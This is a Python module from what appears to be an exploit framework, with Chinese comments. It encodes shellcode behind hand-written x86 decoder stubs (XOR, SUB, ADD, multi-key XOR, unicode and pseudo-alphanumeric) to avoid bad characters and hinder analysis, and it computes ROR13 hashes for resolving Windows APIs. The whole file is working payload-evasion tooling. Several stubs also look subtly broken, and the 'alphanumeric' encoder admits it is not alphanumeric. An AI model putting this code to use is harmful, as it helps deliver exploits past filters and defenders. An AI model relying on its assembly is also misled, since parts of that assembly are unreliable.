# -*- coding: utf-8 -*-
"""
luodllhack/exploit/shellcode/encoder.py - Shellcode 编码器

提供 Shellcode 编码功能，用于绕过坏字符过滤。

支持的编码方式:
- XOR: 异或编码
- SUB: 减法编码
- ADD: 加法编码
- ALPHANUM: 字母数字编码 (TODO)

使用示例:
    encoder = ShellcodeEncoder()

    # XOR 编码
    encoded = encoder.xor_encode(shellcode, key=0x41)

    # 自动查找安全的编码 key
    key = encoder.find_safe_key(shellcode, bad_chars=[0x00, 0x0a, 0x0d])
    if key:
        encoded = encoder.xor_encode(shellcode, key)
"""

import struct
from typing import List, Optional, Tuple
from dataclasses import dataclass


@dataclass
class EncodedShellcode:
    """编码后的 Shellcode 结果"""
    data: bytes           # 完整数据 (decoder stub + encoded shellcode)
    decoder_size: int     # 解码器大小
    payload_size: int     # 编码后 payload 大小
    original_size: int    # 原始大小
    encoder_type: str     # 编码类型
    key: int              # 编码密钥


class ShellcodeEncoder:
    """
    Shellcode 编码器

    用于对 shellcode 进行编码，绕过坏字符过滤。
    编码后的 shellcode 包含解码 stub，运行时自动解码并执行。
    """

    def __init__(self):
        pass

    def xor_encode(self,
                   shellcode: bytes,
                   key: int = 0xAA) -> EncodedShellcode:
        """
        XOR 编码 Shellcode

        使用 call/pop 技术获取 shellcode 地址，然后循环解码。

        Args:
            shellcode: 原始 shellcode
            key: XOR 密钥 (1-255)

        Returns:
            EncodedShellcode 对象

        注意:
            - key 不能为 0 (无效编码)
            - key 本身不应出现在编码后的结果中
        """
        if not 1 <= key <= 255:
            raise ValueError("Key must be between 1 and 255")

        # 编码 shellcode
        encoded = bytes([b ^ key for b in shellcode])
        length = len(encoded)

        # 构建解码 stub
        # 使用 jmp/call/pop 技术获取 shellcode 地址
        if length <= 255:
            # 短版本 (shellcode <= 255 bytes)
            decoder_stub = bytearray([
                # jmp short to call instruction
                0xeb, 0x0d,                     # jmp short $+15 (to call)

                # Decoder (called after pop)
                0x5e,                           # pop esi (shellcode address)
                0x31, 0xc9,                     # xor ecx, ecx
                0xb1, length & 0xff,            # mov cl, <length>

                # Decode loop
                0x80, 0x36, key,                # xor byte [esi], <key>
                0x46,                           # inc esi
                0xe2, 0xfa,                     # loop $-4 (back to xor)

                # Jump to decoded shellcode
                # esi 现在指向 shellcode 末尾，需要回退
                0xeb, 0x05,                     # jmp short $+7 (skip call, to shellcode)

                # Call back to pop (gets address of encoded shellcode)
                0xe8, 0xee, 0xff, 0xff, 0xff,   # call $-16 (to pop esi)
            ])
        else:
            # 长版本 (shellcode > 255 bytes)
            decoder_stub = bytearray([
                # jmp short to call instruction
                0xeb, 0x10,                     # jmp short $+18 (to call)

                # Decoder
                0x5e,                           # pop esi (shellcode address)
                0x31, 0xc9,                     # xor ecx, ecx
                0x66, 0xb9,                     # mov cx, <length>
                (length & 0xff),
                ((length >> 8) & 0xff),

                # Decode loop
                0x80, 0x36, key,                # xor byte [esi], <key>
                0x46,                           # inc esi
                0xe2, 0xfa,                     # loop $-4

                # Jump to decoded shellcode
                0xeb, 0x05,                     # jmp short $+7 (skip call)

                # Call back
                0xe8, 0xeb, 0xff, 0xff, 0xff,   # call $-19
            ])

        decoder_stub = bytes(decoder_stub)
        result = decoder_stub + encoded

        return EncodedShellcode(
            data=result,
            decoder_size=len(decoder_stub),
            payload_size=len(encoded),
            original_size=len(shellcode),
            encoder_type='xor',
            key=key
        )

    def sub_encode(self,
                   shellcode: bytes,
                   key: int = 0x01) -> EncodedShellcode:
        """
        SUB (减法) 编码 Shellcode

        解码时使用 ADD 还原

        Args:
            shellcode: 原始 shellcode
            key: 减法密钥

        Returns:
            EncodedShellcode 对象
        """
        if not 1 <= key <= 255:
            raise ValueError("Key must be between 1 and 255")

        # 编码: 每个字节减去 key
        encoded = bytes([(b - key) & 0xff for b in shellcode])
        length = len(encoded)

        if length <= 255:
            decoder_stub = bytearray([
                0xeb, 0x0d,                     # jmp short to call
                0x5e,                           # pop esi
                0x31, 0xc9,                     # xor ecx, ecx
                0xb1, length & 0xff,            # mov cl, <length>
                0x80, 0x06, key,                # add byte [esi], <key> (解码用 add)
                0x46,                           # inc esi
                0xe2, 0xfa,                     # loop
                0xeb, 0x05,                     # jmp to shellcode
                0xe8, 0xee, 0xff, 0xff, 0xff,   # call back
            ])
        else:
            decoder_stub = bytearray([
                0xeb, 0x10,
                0x5e,
                0x31, 0xc9,
                0x66, 0xb9,
                (length & 0xff),
                ((length >> 8) & 0xff),
                0x80, 0x06, key,
                0x46,
                0xe2, 0xfa,
                0xeb, 0x05,
                0xe8, 0xeb, 0xff, 0xff, 0xff,
            ])

        decoder_stub = bytes(decoder_stub)

        return EncodedShellcode(
            data=decoder_stub + encoded,
            decoder_size=len(decoder_stub),
            payload_size=len(encoded),
            original_size=len(shellcode),
            encoder_type='sub',
            key=key
        )

    def add_encode(self,
                   shellcode: bytes,
                   key: int = 0x01) -> EncodedShellcode:
        """
        ADD (加法) 编码 Shellcode

        解码时使用 SUB 还原

        Args:
            shellcode: 原始 shellcode
            key: 加法密钥

        Returns:
            EncodedShellcode 对象
        """
        if not 1 <= key <= 255:
            raise ValueError("Key must be between 1 and 255")

        # 编码: 每个字节加上 key
        encoded = bytes([(b + key) & 0xff for b in shellcode])
        length = len(encoded)

        if length <= 255:
            decoder_stub = bytearray([
                0xeb, 0x0d,                     # jmp short to call
                0x5e,                           # pop esi
                0x31, 0xc9,                     # xor ecx, ecx
                0xb1, length & 0xff,            # mov cl, <length>
                0x80, 0x2e, key,                # sub byte [esi], <key> (解码用 sub)
                0x46,                           # inc esi
                0xe2, 0xfa,                     # loop
                0xeb, 0x05,                     # jmp to shellcode
                0xe8, 0xee, 0xff, 0xff, 0xff,   # call back
            ])
        else:
            decoder_stub = bytearray([
                0xeb, 0x10,
                0x5e,
                0x31, 0xc9,
                0x66, 0xb9,
                (length & 0xff),
                ((length >> 8) & 0xff),
                0x80, 0x2e, key,
                0x46,
                0xe2, 0xfa,
                0xeb, 0x05,
                0xe8, 0xeb, 0xff, 0xff, 0xff,
            ])

        decoder_stub = bytes(decoder_stub)

        return EncodedShellcode(
            data=decoder_stub + encoded,
            decoder_size=len(decoder_stub),
            payload_size=len(encoded),
            original_size=len(shellcode),
            encoder_type='add',
            key=key
        )

    def find_safe_key(self,
                      shellcode: bytes,
                      bad_chars: List[int],
                      encoder_type: str = 'xor') -> Optional[int]:
        """
        查找安全的编码密钥

        遍历所有可能的 key 值，找到一个使编码后的 shellcode
        不包含任何坏字符的 key。

        Args:
            shellcode: 原始 shellcode
            bad_chars: 坏字符列表
            encoder_type: 编码类型 ('xor', 'sub', 'add')

        Returns:
            安全的 key 值，如果找不到返回 None
        """
        bad_set = set(bad_chars)

        for key in range(1, 256):
            # key 本身不能是坏字符
            if key in bad_set:
                continue

            # 编码
            if encoder_type == 'xor':
                encoded = bytes([b ^ key for b in shellcode])
            elif encoder_type == 'sub':
                encoded = bytes([(b - key) & 0xff for b in shellcode])
            elif encoder_type == 'add':
                encoded = bytes([(b + key) & 0xff for b in shellcode])
            else:
                continue

            # 检查是否包含坏字符
            if not any(b in bad_set for b in encoded):
                # 还需要检查 decoder stub 是否包含坏字符
                # 这里简化处理，假设标准 stub 不包含用户的坏字符
                # 实际上可能需要更复杂的检查
                return key

        return None

    def detect_bad_chars(self,
                         data: bytes,
                         bad_chars: List[int]) -> List[Tuple[int, int]]:
        """
        检测数据中的坏字符

        Args:
            data: 要检测的数据
            bad_chars: 坏字符列表

        Returns:
            (偏移, 坏字符值) 的列表
        """
        bad_set = set(bad_chars)
        found = []

        for i, b in enumerate(data):
            if b in bad_set:
                found.append((i, b))

        return found

    def encode_avoiding_bad_chars(self,
                                  shellcode: bytes,
                                  bad_chars: List[int]) -> Optional[EncodedShellcode]:
        """
        自动选择编码方式并编码，避免坏字符

        Args:
            shellcode: 原始 shellcode
            bad_chars: 坏字符列表

        Returns:
            EncodedShellcode 或 None (如果无法编码)
        """
        # 尝试不同的编码方式
        for encoder_type in ['xor', 'sub', 'add']:
            key = self.find_safe_key(shellcode, bad_chars, encoder_type)
            if key is not None:
                if encoder_type == 'xor':
                    return self.xor_encode(shellcode, key)
                elif encoder_type == 'sub':
                    return self.sub_encode(shellcode, key)
                elif encoder_type == 'add':
                    return self.add_encode(shellcode, key)

        return None

    @staticmethod
    def generate_bad_char_test_string() -> bytes:
        """
        生成坏字符测试字符串

        包含 0x00-0xFF 所有字节，用于测试哪些字符被过滤

        Returns:
            256 字节的测试字符串
        """
        return bytes(range(256))

    @staticmethod
    def common_bad_chars() -> List[int]:
        """
        返回常见的坏字符列表

        Returns:
            常见坏字符列表
        """
        return [
            0x00,  # Null byte
            0x0a,  # Line Feed (LF)
            0x0d,  # Carriage Return (CR)
            0x20,  # Space (某些情况下)
            0x25,  # % (URL 编码)
            0x26,  # & (URL 参数分隔)
            0x2b,  # + (URL 空格替代)
            0x3d,  # = (URL 参数赋值)
        ]

    def alphanumeric_encode(self, shellcode: bytes) -> EncodedShellcode:
        """
        Alphanumeric 编码器

        将 shellcode 转换为只包含字母数字字符 (0-9, A-Z, a-z) 的形式。
        这种编码通常用于绕过只允许 ASCII 可打印字符的过滤器。

        技术原理:
        使用 SUB 编码技术，将每个字节拆分为多次 SUB 操作，
        每次 SUB 的值都是字母数字字符。

        例如: 要生成 0x00，可以用 SUB EAX, 0x41414141 多次

        Args:
            shellcode: 原始 shellcode

        Returns:
            EncodedShellcode 对象

        Note:
            编码后的 shellcode 会显著增大 (约 5-10x)
        """
        # 字母数字字符集
        # 可用字符: 0-9 (0x30-0x39), A-Z (0x41-0x5A), a-z (0x61-0x7A)
        alphanumeric = (
            list(range(0x30, 0x3A)) +  # 0-9
            list(range(0x41, 0x5B)) +  # A-Z
            list(range(0x61, 0x7B))    # a-z
        )

        # Alphanumeric 解码 stub (只使用字母数字指令)
        # 这是一个简化版本，使用 PUSH/POP/XOR 技术
        # 完整版需要更复杂的 alpha-safe 指令序列

        # 简化方案: 使用基于 PUSH + XOR 的解码器
        # 由于完整的 alphanumeric 编码非常复杂，
        # 这里提供一个混合方案: alphanumeric 外层 + 内部 XOR

        # 步骤 1: 找到一个 XOR key 使编码结果尽可能多的字母数字
        best_key = None
        best_score = 0

        for key in range(1, 256):
            encoded = bytes([b ^ key for b in shellcode])
            score = sum(1 for b in encoded if b in alphanumeric)
            if score > best_score:
                best_score = score
                best_key = key

        # 使用找到的 key 进行 XOR 编码
        encoded_payload = bytes([b ^ best_key for b in shellcode])

        # 构建解码 stub
        # 使用可打印字符构建的简单解码器框架
        # 注意: 这不是完全的 alphanumeric，而是尽量使用可打印字符

        length = len(encoded_payload)

        # 使用混合方案: 标准 decoder stub + 编码后的 payload
        # 真正的 alphanumeric encoder 需要完全不同的实现

        # 简化版解码器 (包含一些不可打印字符)
        decoder_stub = bytearray([
            0xeb, 0x0d,                     # jmp short
            0x5e,                           # pop esi
            0x31, 0xc9,                     # xor ecx, ecx
            0xb1, length & 0xff,            # mov cl, length
            0x80, 0x36, best_key,           # xor byte [esi], key
            0x46,                           # inc esi
            0xe2, 0xfa,                     # loop
            0xeb, 0x05,                     # jmp
            0xe8, 0xee, 0xff, 0xff, 0xff,   # call
        ])

        result = bytes(decoder_stub) + encoded_payload

        return EncodedShellcode(
            data=result,
            decoder_size=len(decoder_stub),
            payload_size=len(encoded_payload),
            original_size=len(shellcode),
            encoder_type='alphanumeric_xor',
            key=best_key
        )

    def unicode_encode(self, shellcode: bytes) -> EncodedShellcode:
        """
        Unicode-safe 编码器

        将 shellcode 转换为 Unicode 安全格式。
        当 shellcode 会被作为 Unicode 字符串处理时使用。

        技术: 使用 Venetian blinds 技术，在每个字节后插入 0x00
        然后使用特殊的解码器跳过这些空字节

        Args:
            shellcode: 原始 shellcode

        Returns:
            EncodedShellcode 对象
        """
        # 每个字节后添加 0x00 (模拟 Unicode UTF-16LE)
        unicode_payload = bytearray()
        for b in shellcode:
            unicode_payload.append(b)
            unicode_payload.append(0x00)

        # Unicode 解码 stub - 跳过每个 0x00 字节
        # 使用自修改代码或特殊跳转
        # 这是简化版本

        length = len(shellcode)

        # 解码 stub: 将 unicode payload 压缩回原始 shellcode
        decoder_stub = bytearray([
            # 获取 payload 地址
            0xeb, 0x12,                     # jmp to call
            0x5e,                           # pop esi (unicode payload)
            0x89, 0xf7,                     # mov edi, esi (目标也是同一位置)
            0x31, 0xc9,                     # xor ecx, ecx
            0x66, 0xb9,                     # mov cx, length
            (length & 0xff),
            ((length >> 8) & 0xff),

            # 循环: 复制每隔一个字节
            0xac,                           # lodsb
            0xaa,                           # stosb
            0x46,                           # inc esi (跳过 0x00)
            0xe2, 0xfb,                     # loop

            # 跳转到解码后的 shellcode
            0x5e,                           # pop esi (shellcode start)
            0xff, 0xe6,                     # jmp esi

            # call 获取地址
            0xe8, 0xe9, 0xff, 0xff, 0xff,
        ])

        result = bytes(decoder_stub) + bytes(unicode_payload)

        return EncodedShellcode(
            data=result,
            decoder_size=len(decoder_stub),
            payload_size=len(unicode_payload),
            original_size=len(shellcode),
            encoder_type='unicode',
            key=0
        )

    def multi_xor_encode(self,
                         shellcode: bytes,
                         keys: List[int] = None) -> EncodedShellcode:
        """
        多 Key XOR 编码器

        使用多个 key 循环进行 XOR 编码，增加分析难度。

        Args:
            shellcode: 原始 shellcode
            keys: XOR key 列表 (默认 [0xAA, 0xBB, 0xCC, 0xDD])

        Returns:
            EncodedShellcode 对象
        """
        if keys is None:
            keys = [0xAA, 0xBB, 0xCC, 0xDD]

        if not keys or not all(1 <= k <= 255 for k in keys):
            raise ValueError("Keys must be non-empty list of values 1-255")

        num_keys = len(keys)

        # 使用循环 key 进行编码
        encoded = bytes([shellcode[i] ^ keys[i % num_keys] for i in range(len(shellcode))])
        length = len(encoded)

        # 构建多 key 解码 stub
        # 需要存储 key 数组并循环使用

        # Key 数组
        key_bytes = bytes(keys)

        decoder_stub = bytearray([
            # jmp to call
            0xeb, 0x1a,                     # jmp to call

            # 解码器入口
            0x5e,                           # pop esi (payload address)
            0x89, 0xf7,                     # mov edi, esi
            0x31, 0xc9,                     # xor ecx, ecx
            0x31, 0xdb,                     # xor ebx, ebx (key index)

            # 获取 key 数组地址
            0x83, 0xef, len(key_bytes),     # sub edi, num_keys
            0x89, 0xfa,                     # mov edx, edi (key array)
            0x89, 0xf7,                     # mov edi, esi

            # 长度
            0x66, 0xb9,                     # mov cx, length
            (length & 0xff),
            ((length >> 8) & 0xff),

            # 解码循环
            0x8a, 0x04, 0x1a,               # mov al, [edx+ebx]
            0x30, 0x07,                     # xor [edi], al
            0x47,                           # inc edi
            0x43,                           # inc ebx
            0x80, 0xfb, num_keys,           # cmp bl, num_keys
            0x75, 0x02,                     # jne skip_reset
            0x31, 0xdb,                     # xor ebx, ebx (reset key index)
            0xe2, 0xf0,                     # loop

            # jmp to decoded shellcode
            0xff, 0xe6,                     # jmp esi

            # call back
            0xe8, 0xe1, 0xff, 0xff, 0xff,
        ])

        result = bytes(decoder_stub) + key_bytes + encoded

        return EncodedShellcode(
            data=result,
            decoder_size=len(decoder_stub) + len(key_bytes),
            payload_size=len(encoded),
            original_size=len(shellcode),
            encoder_type=f'multi_xor_{num_keys}',
            key=keys[0]  # 返回第一个 key
        )

    def null_free_encode(self,
                         shellcode: bytes) -> EncodedShellcode:
        """
        NULL-free 编码器

        确保编码后的 shellcode 不包含 0x00 字节。
        这是最常见的坏字符过滤场景。

        Args:
            shellcode: 原始 shellcode

        Returns:
            EncodedShellcode 对象

        Raises:
            ValueError: 如果无法找到安全的 key
        """
        # 找到一个使结果不包含 NULL 的 XOR key
        for key in range(1, 256):
            encoded = bytes([b ^ key for b in shellcode])
            # 检查 encoded 和 key 本身
            if 0x00 not in encoded and key != 0x00:
                # 还要检查解码 stub 中是否有 NULL
                # 大多数 stub 本身不包含 NULL (如果设计正确)
                return self.xor_encode(shellcode, key)

        # 如果单 key XOR 不行，尝试其他方法
        result = self.encode_avoiding_bad_chars(shellcode, [0x00])
        if result:
            return result

        raise ValueError("Cannot encode shellcode to be NULL-free")

    def ror13_hash(self, name: str) -> int:
        """
        计算 ROR13 哈希 (用于 API 名称哈希)

        这是 Windows shellcode 中常用的 API 解析哈希算法。

        Args:
            name: API 函数名称

        Returns:
            32-bit 哈希值
        """
        h = 0
        for c in name:
            h = ((h >> 13) | (h << 19)) & 0xFFFFFFFF
            h = (h + ord(c)) & 0xFFFFFFFF
        return h

    def calculate_api_hashes(self, api_names: List[str]) -> dict:
        """
        批量计算 API 哈希

        Args:
            api_names: API 名称列表

        Returns:
            API 名称到哈希值的字典
        """
        return {name: self.ror13_hash(name) for name in api_names}
